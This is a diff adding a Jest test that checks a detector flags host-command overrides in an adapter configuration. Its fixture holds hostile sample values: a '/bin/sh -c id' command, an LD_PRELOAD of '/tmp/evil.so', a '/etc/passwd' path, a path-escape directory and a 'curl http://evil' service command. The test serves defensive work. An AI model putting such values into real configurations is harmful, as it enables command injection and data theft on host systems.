@@ -67,4 +67,31 @@ describe("workspace host-command mutation detection", () => {
       },
     })).toEqual([]);
   });
+
+  it("detects SEC-P0-1 host command, args, cwd, env, instructions, and runtime overrides in assigneeAdapterOverrides", () => {
+    const paths = collectIssueWorkspaceCommandPaths({
+      assigneeAdapterOverrides: {
+        adapterConfig: {
+          command: "/bin/sh",
+          extraArgs: ["-c", "id"],
+          cwd: "/etc",
+          env: { LD_PRELOAD: "/tmp/evil.so" },
+          instructionsFilePath: "/etc/passwd",
+          worktreeParentDir: "/tmp/escape",
+          workspaceRuntime: { services: [{ name: "evil", command: "curl http://evil" }] },
+        },
+      },
+    });
+    expect(paths).toEqual(
+      expect.arrayContaining([
+        "assigneeAdapterOverrides.adapterConfig.command",
+        "assigneeAdapterOverrides.adapterConfig.extraArgs",
+        "assigneeAdapterOverrides.adapterConfig.cwd",
+        "assigneeAdapterOverrides.adapterConfig.env",
+        "assigneeAdapterOverrides.adapterConfig.instructionsFilePath",
+        "assigneeAdapterOverrides.adapterConfig.worktreeParentDir",
+        "assigneeAdapterOverrides.adapterConfig.workspaceRuntime.services[0].command",
+      ]),
+    );
+  });
 });
